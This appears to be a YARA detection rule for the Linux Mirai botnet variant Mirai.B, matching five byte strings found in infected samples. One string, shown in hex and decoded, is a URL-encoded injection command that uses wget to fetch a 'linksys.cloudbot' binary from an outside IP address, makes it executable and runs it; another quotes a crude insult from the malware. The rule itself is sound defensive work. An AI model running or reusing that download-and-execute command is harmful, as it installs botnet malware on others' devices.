
rule Backdoor_Linux_Mirai_B_MTB{
	meta:
		description = "Backdoor:Linux/Mirai.B!MTB,SIGNATURE_TYPE_ELFHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_00_0 = {61 69 72 64 72 6f 70 6d 61 6c 77 61 72 65 } //1 airdropmalware
		$a_00_1 = {54 73 75 6e 61 6d 69 } //1 Tsunami
		$a_00_2 = {4b 49 4c 4c 41 54 54 4b } //1 KILLATTK
		$a_00_3 = {79 6f 75 72 5f 76 65 72 72 79 5f 66 75 63 6b 69 6e 67 5f 67 61 79 } //1 your_verry_fucking_gay
		$a_00_4 = {77 67 65 74 2b 68 74 74 70 25 33 41 25 32 46 25 32 46 31 37 39 2e 34 33 2e 31 34 39 2e 31 38 39 25 32 46 62 69 6e 73 25 32 46 6c 69 6e 6b 73 79 73 2e 63 6c 6f 75 64 62 6f 74 25 33 42 2b 63 68 6d 6f 64 2b 37 37 37 2b 6c 69 6e 6b 73 79 73 2e 63 6c 6f 75 64 62 6f 74 25 33 42 2b 2e 25 32 46 6c 69 6e 6b 73 79 73 2e 63 6c 6f 75 64 62 6f 74 2b 6c 69 6e 6b 73 79 73 2e 63 6c 6f 75 64 62 6f 74 25 36 30 } //1 wget+http%3A%2F%2F179.43.149.189%2Fbins%2Flinksys.cloudbot%3B+chmod+777+linksys.cloudbot%3B+.%2Flinksys.cloudbot+linksys.cloudbot%60
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1+(#a_00_3  & 1)*1+(#a_00_4  & 1)*1) >=5
 
}